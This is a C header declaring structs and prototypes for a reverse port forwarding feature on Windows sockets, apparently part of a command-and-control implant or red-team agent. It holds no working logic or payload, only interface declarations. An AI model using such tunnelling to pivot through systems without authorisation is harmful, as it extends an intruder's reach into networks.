#pragma once
#ifndef TUNNEL_H
#define TUNNEL_H

#include <windows.h>
#include <winsock2.h>
#include "Parser.h"
#include "Config.h"

#ifdef INCLUDE_CMD_RPORTFWD

#define MAX_RPORTFWD_READS_PER_LOOP    30
#define RPORTFWD_BUFFER_SIZE           65535   // 64kb
#define RPORTFWD_LISTEN_BACKLOG        16

typedef struct _RPORTFWD_LISTENER {
    UINT32  Port;
    SOCKET  ListenSocket;
    struct _RPORTFWD_LISTENER* Next;
} RPORTFWD_LISTENER, *PRPORTFWD_LISTENER;

typedef struct _RPORTFWD_CONN {
    UINT32  ServerId;
    UINT32  Port;
    SOCKET  Socket;
    BOOL    Connected;
    struct _RPORTFWD_CONN* Next;
} RPORTFWD_CONN, *PRPORTFWD_CONN;

VOID Rportfwd(PCHAR taskUuid, PPARSER arguments);
VOID RportfwdProcessData(PPARSER parser);
VOID RportfwdPush();
PRPORTFWD_CONN RportfwdFindConnection(UINT32 serverId);
PRPORTFWD_LISTENER RportfwdFindListener(UINT32 port);
BOOL RportfwdListen(UINT32 port);
BOOL RportfwdStopListener(UINT32 port);
BOOL RportfwdRemove(UINT32 serverId);
VOID RportfwdSendResponse(UINT32 serverId, UINT32 port, PBYTE data, UINT32 dataLen, BOOL exitFlag);

#endif  // INCLUDE_CMD_RPORTFWD

#endif  // TUNNEL_H
